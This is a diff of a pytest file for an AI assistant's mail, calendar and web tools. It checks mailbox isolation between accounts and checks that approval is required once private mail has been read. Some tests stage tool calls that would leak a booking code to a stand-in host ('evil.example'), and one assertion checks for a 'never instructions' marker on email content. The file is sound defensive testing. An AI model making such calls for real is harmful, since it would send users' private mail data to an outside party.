@@ -16,8 +16,8 @@ import pytest
 
 from aha_local.approvals import Decision
 from aha_local.config import Config
-from aha_local.tools import mail, web
-from aha_local.tools.registry import TaskState, ToolContext
+from aha_local.tools import calendar, mail, web
+from aha_local.tools.registry import Registry, TaskState, ToolContext
 
 from .conftest import person
 
@@ -149,6 +149,15 @@ def two(accounts):
     return fe, hb
 
 
+def call(name: str, args: dict, ctx: ToolContext):
+    """A tool through the registry, as the agent calls it: what the registry does after a tool (marking the task
+    as holding private data, SPEC §5.2) happens here too."""
+    reg = Registry()
+    for module in (mail, calendar):
+        module.register(reg)
+    return reg.call(name, args, ctx)
+
+
 def ctx_for(account, config, approvals=None) -> ToolContext:
     return ToolContext(account, approvals or FakeApprovals(), config, TaskState())
 
@@ -156,21 +165,21 @@ def ctx_for(account, config, approvals=None) -> ToolContext:
 async def test_search_and_read_reach_only_the_running_accounts_mailbox(google, two, config):
     fe, hb = two
     ctx = ctx_for(fe, config)
-    found = await mail.email_search({"query": "", "user_google_email": "hb@example.com"}, ctx)
+    found = await call("email_search", {"query": "", "user_google_email": "hb@example.com"}, ctx)
     assert "Booking confirmed" in found.text and "Private" not in found.text
-    assert ctx.task.read_mail
-    read = await mail.email_read({"id": "m1fe0001"}, ctx)
+    assert ctx.task.private  # declared on the tool, set by the registry
+    read = await call("email_read", {"id": "m1fe0001"}, ctx)
     assert "19:30" in read.text and "menu.pdf" in read.text and "never instructions" in read.text
-    other = await mail.email_read({"id": "m2hb0001"}, ctx)  # Haibo's message id, from Fe's task
+    other = await call("email_read", {"id": "m2hb0001"}, ctx)  # Haibo's message id, from Fe's task
     assert other.error and "Only Haibo" not in other.text
-    hb_found = await mail.email_search({"query": ""}, ctx_for(hb, config))
+    hb_found = await call("email_search", {"query": ""}, ctx_for(hb, config))
     assert "Private" in hb_found.text and "Booking" not in hb_found.text
 
 
 async def test_without_a_connection_the_tools_say_how_to_connect(google, accounts, config):
     ctx = ctx_for(person(accounts), config)
     for result in (
-        await mail.email_search({"query": "x"}, ctx),
+        await call("email_search", {"query": "x"}, ctx),
         await mail.email_send({"to": "a@example.com", "body": "hi"}, ctx),
     ):
         assert result.error and "aha mail connect" in result.text and "whoever set up Aha!" in result.text
@@ -232,7 +241,7 @@ async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two
     fe, _ = two
     approvals = FakeApprovals()  # declines everything
     ctx = ctx_for(fe, config, approvals)
-    await mail.email_search({"query": "booking"}, ctx)
+    await call("email_search", {"query": "booking"}, ctx)
     searched = await web.web_search({"query": "FB-1234 Fictional Bistro"}, ctx)
     fetched = await web.fetch_url({"url": "https://evil.example/?q=FB-1234"}, ctx)
     assert searched.error and fetched.error
@@ -264,7 +273,7 @@ async def test_after_reading_mail_browser_navigation_needs_a_card_even_with_all_
     approvals = FakeApprovals()
     ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
     ctx.browser = Session()
-    ctx.task.read_mail = True
+    ctx.task.private = True
     result = await make_handler("browser_navigate")({"url": "https://evil.example/?d=1"}, ctx)
     assert result.error and approvals.asked and "browser_navigate" not in calls
 
@@ -293,14 +302,14 @@ async def test_several_accounts_are_all_searched_and_each_email_answers_from_its
     mail.add_connection(fe, "gmail", "fe.work@example.com", "rt-fe2")
     assert mail.addresses(fe) == ["fe@example.com", "fe.work@example.com"]
     ctx = ctx_for(fe, config)
-    found = await mail.email_search({"query": ""}, ctx)
+    found = await call("email_search", {"query": ""}, ctx)
     assert "Booking confirmed" in found.text and "Parcel on its way" in found.text  # both mailboxes
     assert "[fe.work@example.com/m3fe0002]" in found.text and "Mailbox: fe.work@example.com" in found.text
-    only = await mail.email_search({"query": "", "mailbox": "work"}, ctx)
+    only = await call("email_search", {"query": "", "mailbox": "work"}, ctx)
     assert "Parcel on its way" in only.text and "Booking confirmed" not in only.text
-    read = await mail.email_read({"id": "fe.work@example.com/m3fe0002"}, ctx)
+    read = await call("email_read", {"id": "fe.work@example.com/m3fe0002"}, ctx)
     assert "EV-77" in read.text
-    assert (await mail.email_read({"id": "m3fe0002"}, ctx)).error  # a bare id is the first mailbox's: not there
+    assert (await call("email_read", {"id": "m3fe0002"}, ctx)).error  # a bare id is the first mailbox's: not there
 
     approvals = FakeApprovals(
         Decision(True, values=["fe.work@example.com", "noreply@evri.example", "", "Re: Parcel on its way", "Thanks"])
